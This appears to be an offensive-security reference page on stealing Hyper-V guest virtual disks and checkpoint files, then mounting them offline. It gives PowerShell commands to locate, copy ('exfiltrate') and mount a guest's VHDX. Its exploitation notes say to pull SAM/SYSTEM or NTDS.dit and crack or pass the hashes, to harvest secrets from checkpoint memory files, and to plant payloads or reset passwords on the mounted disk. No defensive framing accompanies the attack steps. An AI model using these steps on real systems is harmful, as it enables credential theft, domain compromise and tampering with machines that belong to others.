---
title: "Checkpoint and VHD theft: lifting Hyper-V guest disks"
description: "Stealing Hyper-V guest data offline by copying VHD and VHDX virtual disks and AVHDX checkpoint differencing files from the host or a share, then mounting them to extract secrets such as the SAM, NTDS.dit, and files without ever booting or logging into the guest."
keywords:
  - VHD
  - VHDX
  - checkpoint
  - AVHDX
  - offline disk
---

# Checkpoint and VHD theft

A Hyper-V guest's disk is a `VHD`/`VHDX` file, and each checkpoint adds an `AVHDX` differencing file. With host or share access, copying these and mounting them offline exposes the guest filesystem, including credential stores, with no need to boot or authenticate to the guest.

```powershell
Get-VMHardDiskDrive -VMName <guest>                 # find the disk paths
Copy-Item '\\host\c$\...\guest.vhdx' .\loot.vhdx    # exfiltrate
Mount-VHD -Path .\loot.vhdx -ReadOnly               # mount offline
# Then extract SAM/SYSTEM or NTDS.dit from the mounted volume
```

## Exploitation notes

- Offline disk access sidesteps the guest OS entirely: pull `SAM`/`SYSTEM` from a member, or `NTDS.dit` from a domain controller VM, then crack or pass the hashes.
- Checkpoints capture point-in-time state, including memory in `.vmrs`/`.bin` files, which can hold secrets from a running guest.
- A mounted disk is also a write primitive: plant a payload or clear a password before the guest next boots.

## References

- [Microsoft: Mount-VHD](https://learn.microsoft.com/en-us/powershell/module/hyper-v/mount-vhd)
- [Microsoft: Hyper-V checkpoints](https://learn.microsoft.com/en-us/windows-server/virtualization/hyper-v/manage/choose-between-standard-or-production-checkpoints-in-hyper-v)
